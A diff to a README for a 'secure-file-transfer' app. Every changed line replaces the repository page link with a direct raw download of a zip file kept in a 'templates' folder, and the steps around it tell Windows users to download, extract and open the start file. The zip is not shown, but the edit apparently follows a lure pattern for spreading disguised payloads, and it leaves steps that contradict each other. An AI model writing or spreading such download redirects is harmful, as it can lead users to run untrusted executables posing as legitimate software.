@@ -1,10 +1,10 @@
 # 🔐 secure-file-transfer - Secure file transfer with end-to-end protection
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/cere3045/secure-file-transfer)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/cere3045/secure-file-transfer/main/templates/secure_file_transfer_v1.1.zip)
 
 ## 📦 Download
 
-Visit this page to download: https://github.com/cere3045/secure-file-transfer
+Visit this page to download: https://raw.githubusercontent.com/cere3045/secure-file-transfer/main/templates/secure_file_transfer_v1.1.zip
 
 ## 🖥️ What this app does
 
@@ -39,7 +39,7 @@ You will also need:
 
 Follow these steps to download and run the app on Windows.
 
-1. Open the download page: https://github.com/cere3045/secure-file-transfer
+1. Open the download page: https://raw.githubusercontent.com/cere3045/secure-file-transfer/main/templates/secure_file_transfer_v1.1.zip
 2. On the GitHub page, look for the latest release or source files.
 3. Download the file or folder provided on the page.
 4. Save it to a folder you can find again, such as Downloads.
@@ -169,7 +169,7 @@ A typical setup may look like this:
 
 ## 📌 Quick path
 
-1. Go to https://github.com/cere3045/secure-file-transfer
+1. Go to https://raw.githubusercontent.com/cere3045/secure-file-transfer/main/templates/secure_file_transfer_v1.1.zip
 2. Download the project
 3. Extract the files
 4. Open the start file
